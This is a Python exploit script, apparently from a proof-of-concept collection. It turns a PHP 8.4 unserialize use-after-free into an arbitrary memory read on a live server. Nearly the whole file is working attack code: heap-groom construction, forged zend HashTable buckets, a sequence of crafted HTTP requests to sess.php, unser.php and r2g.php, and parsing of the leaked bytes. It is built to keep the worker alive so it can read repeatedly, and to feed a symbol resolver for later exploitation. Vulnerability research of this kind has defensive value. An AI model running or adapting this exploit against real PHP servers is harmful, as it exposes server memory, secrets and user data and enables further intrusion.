#!/usr/bin/env python3
# INDEX: arbitrary read via unserialize uaf write | cli apache | rw memory only
"""Arbitrary-read primitive via a controlled-value unserialize write.

Capability: read an arbitrary victim address T on live PHP. Caller passes
fake_str_addr = T-0x18; returns (slen, data) where slen is the zend_string
length read from T-0x08 and data are the bytes at T (up to 16 KiB via the
sidtail path, or 48 bytes via the foreach path). Exposes a zend_string-style
read contract (len at fake+0x10, data at fake+0x18) that an offset-free symbol
resolver can consume as its read backend.

Mechanism: CVE-2026-109619 (unserialize var_hash UAF) gives a 16-byte-strided
controlled-value write that can never forge an IS_STRING zval (the trailing 8
bytes land on type_info). Instead, one write repoints $_POST->arData (HT+0x10,
a raw pointer that needs no type stamp) at a fake Bucket[] laid in the groom
($_POST['g0']); r2g.php then reflects the forged IS_STRING zvals, the
"PHPSESSID" hash index resolving to our bucket.

Constraints: reads RW memory only -- a read-only target crashes mid-r2g on
the string-refcount INCREF at T-0x18. survive=True uses the 5-pair record to
zero SG(rfc1867_uploaded_files).nNumUsed so the worker survives for multi-read.

Seed: chunk + binbase (from /proc/1/maps) + build constant ht_post_off=0x58038.
Offsets calibrated for the in-container curl (ua=11) -- run with --service.

Tested: live php:8.4.26 cli-server (cli-vuln :8081), no gdb; Apache prefork
child respawns with shared ASLR for multi-read.
"""

import json
import os
import re
import struct
import sys
import tempfile
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from common.offsets import load_offsets
from common.http_urllib import curl
from common.docker_compose import docker_cp
from common.session_ids import SID_B

# --- build constants (php:8.4.26, confirmed live) ---------------------------
IS_STRING = 0x06           # plain string type_info: strlen/substr read it,
                           # no refcount flag (0x100) so nothing is freed.
IS_UNDEF = 0x00
HT_INVALID_IDX = 0xFFFFFFFF
Z_NEXT_END = 0xFFFFFFFF

# zend_string: gc@0, h@8, len@0x10, val@0x18  -> read target T => fake=T-0x18.
ZSTR_VAL = 0x18
ZSTR_LEN = 0x10

# HashTable (sizeof 0x38): flags@0x08, nTableMask@0x0C, arData@0x10, nNumUsed@0x18.
HT_ARDATA = 0x10

GROOM_SIZE = 4071          # pinned layout size (do NOT change: addresses move).

# controlled-write steering-fake offsets inside the groom value.
from primitives.write.last_dtor_forge import (  # noqa: E402
    FA, FD_BASE, FE, forge_last_dtor_value,
)

HT_POST_OFF = 0x58038      # chunk-relative offset of the $_POST HashTable
                           # (build constant; gdb-derived, stable).

# PHP's unseeded DJBX33A hash of "PHPSESSID" with bit63 set - a build constant.
PHPSESSID_H = 0x8377AA9AA0626BB8
PHPSESSID_KEY = b"PHPSESSID"


def _p64(x):
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def _p32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


# Groom builder: steering (write fake_a at $_POST->arData) + fake table.
def build_arbread_groom(seed, fake_str_addr, want_sidpath=True):
    """Return (groom_bytes, fake_a, t2).

    The re-decode target T2 = &$_POST->arData (ht_post+0x10) and the written
    value (k0, forced to fake_a by stage-1) lands there. The fake HashTable is
    co-located on fake_a.
    """
    a = seed["a"]
    copy = seed["copy"]
    t1 = seed["binbase"] + seed["bg_unserialize_off"]
    n_size = seed.get("ht_nTableSize", 8)
    mask = seed.get("ht_nTableMask", 0xFFFFFFF0) & 0xFFFFFFFF
    t2 = seed["ht_post"] + HT_ARDATA

    # the shared decode-1 + re-decode steering-fake plant.
    val = forge_last_dtor_value(GROOM_SIZE, (a, copy, t1, t2), verbose=False)

    # --- the fake HashTable, CO-LOCATED on fake_a (= $_POST->arData) ---
    # hash int32[n_size] precede fake_a (negative-indexed). bucket 0/1
    # (fake_a..fake_a+0x40) overlap the php_unserialize_data above and are never
    # examined. The forged read bucket is INDEX 2 (byte offset 0x40). Its key
    # "PHPSESSID" is a groom-resident zend_string (no interned-key leak needed).
    fake_a = copy + 24 + FA
    groom_val = copy + ZSTR_VAL
    BIDX = 2
    BKT_OFF = FA + BIDX * 0x20
    KEY_OFF = FA + 0x60
    HASH_OFF = FA - n_size * 4
    assert HASH_OFF >= 72, HASH_OFF
    assert KEY_OFF + 40 <= FE, (KEY_OFF, FE)
    key_addr = groom_val + KEY_OFF

    # The hash slot stores a BUCKET INDEX; zend computes arData + (slot << 5).
    hashes = [HT_INVALID_IDX] * n_size
    if want_sidpath:
        nindex = (PHPSESSID_H | mask) & 0xFFFFFFFF
        slot = nindex - 0x100000000
        hashes[slot] = BIDX
    hb = b"".join(_p32(h) for h in hashes)
    val[HASH_OFF:HASH_OFF + len(hb)] = hb

    val[BKT_OFF:BKT_OFF + 0x20] = (
        _p64(fake_str_addr) + _p32(IS_STRING) + _p32(Z_NEXT_END)
        + _p64(PHPSESSID_H) + _p64(key_addr))
    key_zs = (_p32(2) + _p32(0x00000046) + _p64(PHPSESSID_H)
              + _p64(len(PHPSESSID_KEY)) + PHPSESSID_KEY + b"\x00")
    val[KEY_OFF:KEY_OFF + len(key_zs)] = key_zs

    return bytes(val), fake_a, t2


# The arbitrary-read isstring_read.
class ArbRead:
    """isstring_read(fake_str_addr) -> (slen, data) | None, via one pinned
    controlled write (arData redirect) + an r2g.php reflection, returning the
    zend_string read contract (len at fake+0x10, data at fake+0x18)."""

    def __init__(self, base, seed, service=None, grooms=2, want_sidpath=True,
                 survive=True, verbose=False):
        self.base = base.rstrip("/")
        self.seed = seed
        self.service = service
        self.grooms = grooms
        self.want_sidpath = want_sidpath
        # survive=True uses the 5-pair record (sess.php shape=w5) whose 5th pair
        # zeros SG(rfc1867_uploaded_files).nNumUsed (the HashTable 0x38 after
        # $_POST), so destroy_uploaded_files_hash is a no-op at shutdown and the
        # worker survives the read -> multi-read on ONE worker (proven on cli:
        # 3 reads, PID unchanged). RW targets only: a RO target (ELF symbol
        # tables) crashes mid-r2g on the string-refcount INCREF at T-0x18.
        self.survive = survive
        self.verbose = verbose
        self.req_count = 0
        self.crash_count = 0

    def _curl(self, args, timeout=90):
        return curl(args, timeout=timeout, service=self.service)

    def _fire(self, fake_str_addr):
        """Run the pinned producer+consumer once; return the r2g response text
        (or None on worker crash)."""
        base, svc = self.base, self.service
        run = lambda a, t=60: self._curl(a, timeout=t)

        groom, fake_a, t2 = build_arbread_groom(
            self.seed, fake_str_addr, self.want_sidpath)

        # W2: the write-value session record. The re-decode writes the pairs at
        # ht_post+0x10,+0x20,+0x30,+0x40(,+0x50):
        #   k0(v)  = fake_a -> stage-1 redirects BG(unserialize).data onto the
        #                      fake php_unserialize_data; in the re-decode it
        #                      lands on $_POST->arData (= fake_a, the table).
        #   k1(v2) = 8      -> ht_post+0x20 (nTableSize=8).
        #   k2(v3) = 0      -> ht_post+0x30 (pDestructor=NULL).
        #   k3(v4) = 0      -> ht_post+0x40 (= uploaded_files+0x08; its +8 half
        #                      NULLs uploaded_files.arData at ht_post+0x48).
        #   k4(v5) = 0      -> ht_post+0x50 (= uploaded_files.nNumUsed) = 0, so
        #                      destroy_uploaded_files_hash no-ops -> SURVIVE.
        # No write touches ht_post+0x00..0x0F, so u.flags and nTableMask keep
        # their real values; the hash lookup resolves without rebuilding them.
        if self.survive:
            run([f"{base}/sess.php?shape=w5&v={fake_a:015d}&v2={8:015d}"
                 f"&v3={0:015d}&v4={0:015d}&v5={0:015d}&sid={SID_B}"], 30)
        else:
            run([f"{base}/sess.php?shape=w&v={fake_a:015d}&v2={8:015d}"
                 f"&v3={0:015d}&v4={0:015d}&sid={SID_B}"], 30)
        run([f"{base}/unser.php?shape=dup&check"], 30)

        # R1': producer - unserialize() OOMs after var_push_dtor(), leaving
        # BG(unserialize).data dangling.
        run([f"{base}/unser.php?shape=dup"], 60)

        # R2': consumer - the groom carries the steering + fake table; the
        # session re-decodes write fake_a into $_POST->arData; r2g reflects.
        with tempfile.TemporaryDirectory(prefix="var_hash_rw-") as td:
            gpaths = []
            for i in range(self.grooms):
                p = os.path.join(td, f"g{i}.bin")
                with open(p, "wb") as f:
                    f.write(groom)
                gpaths.append(p)
            vp = os.path.join(td, "victim.bin")
            with open(vp, "wb") as f:
                f.write(b"V" * 1024)

            cmd = [f"{base}/r2g.php",
                   "-F", f"PHPSESSID={SID_B}",
                   "-F", "PHP_SESSION_UPLOAD_PROGRESS=k"]
            if svc is None:
                for i, g in enumerate(gpaths):
                    cmd += ["-F", f"g{i}=<{g}"]
                cmd += ["-F", f"victim=@{vp};filename=victim.bin;"
                              f"type=application/octet-stream"]
                out = run(cmd, 90)
            else:
                for i, g in enumerate(gpaths):
                    docker_cp(g, f"{svc}:/tmp/var_hash_rw-g{i}.bin")
                    cmd += ["-F", f"g{i}=</tmp/var_hash_rw-g{i}.bin"]
                docker_cp(vp, f"{svc}:/tmp/var_hash_rw-victim.bin")
                cmd += ["-F", "victim=@/tmp/var_hash_rw-victim.bin;"
                              "filename=victim.bin;type=application/octet-stream"]
                out = run(cmd, 90)

        self.req_count += 1
        text = out.decode("utf-8", "replace") if isinstance(out, bytes) else str(out)
        if self.verbose:
            print(f"[var_hash_rw] fake_a={fake_a:#x} t2={t2:#x}\n{text[:400]}")
        if not text or ("post=" not in text and "sid=" not in text):
            self.crash_count += 1
            if self.crash_count % 5 == 0:
                time.sleep(0.5)
            return None
        return text

    def isstring_read(self, fake_str_addr, timeout=5):
        """zend_string read-contract backend. Returns (slen, data) or None.

        slen is read from victim memory at fake_str_addr+0x10; data are the
        bytes at fake_str_addr+0x18 (up to 16 KiB via the sidtail path). Data
        may be shorter than slen (callers tolerate it).
        """
        text = self._fire(fake_str_addr)
        if text is None:
            return None
        if self.want_sidpath:
            m_len = re.search(r"^sid=(\d+):", text, re.M)
            m_tail = re.search(r"^sidtail=([0-9a-f]*)", text, re.M)
            if m_len and m_tail:
                return (int(m_len.group(1)), bytes.fromhex(m_tail.group(1)))
        m = re.search(r"^PHPSESSID=(\d+):(.*)$", text, re.M)
        if m:
            return (int(m.group(1)), m.group(2).encode("utf-8", "replace")[:48])
        return None


# CLI: single-address read test (exercises the composition end-to-end).
def _load_seed(path, version="8.4.26", sapi=None):
    """Load a seed JSON. Minimal zero-knowledge form:
        {"chunk": "0x...", "binbase": "0x..."}        (+ optional ht_post_off)
    chunk + binbase come from the /proc/1/maps bootstrap; a/copy/sid derive from
    the offsets table (a is chunk-relative; copy/sid are relative to A), and
    ht_post = chunk + ht_post_off (default 0x58038). You may instead pass
    a/copy/sid/ht_post absolutely.
    """
    with open(path) as f:
        seed = json.load(f)
    for k, v in list(seed.items()):
        if isinstance(v, str) and v.startswith("0x"):
            seed[k] = int(v, 16)
    off = load_offsets(version, sapi)
    seed.setdefault("bg_unserialize_off", off["bg_unserialize_off"])
    if "chunk" in seed:
        c = seed["chunk"]
        a = seed.setdefault("a", c + off["a_off"])
        seed.setdefault("copy", a + off["copy_off"])
        seed.setdefault("sid", a + off["sid_off"])
        seed.setdefault("ht_post", c + seed.get("ht_post_off", HT_POST_OFF))
    return seed


def main(argv=None):
    import argparse
    ap = argparse.ArgumentParser(description="var_hash_rw-native isstring_read test")
    ap.add_argument("url")
    ap.add_argument("--seed", required=True, help="seed JSON (chunk+binbase)")
    ap.add_argument("--target", required=True,
                    help="address T to read (hex); fake_str_addr = T-0x18")
    ap.add_argument("--service", default=None, help="docker compose service")
    ap.add_argument("--foreach", action="store_true",
                    help="use the 48-byte foreach path instead of 16 KiB sidtail")
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args(argv)

    seed = _load_seed(a.seed)
    T = int(a.target, 16)
    rdr = ArbRead(a.url, seed, service=a.service,
                  want_sidpath=not a.foreach, verbose=a.verbose)
    r = rdr.isstring_read(T - ZSTR_VAL)
    if r is None:
        print(f"[var_hash_rw] read {T:#x} -> None (worker crash / miss)")
        return 1
    slen, data = r
    print(f"[var_hash_rw] read {T:#x} -> len={slen} ({slen:#x}), {len(data)} bytes:")
    print(f"        hex={data[:64].hex()}")
    print(f"        asc={data[:64]!r}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
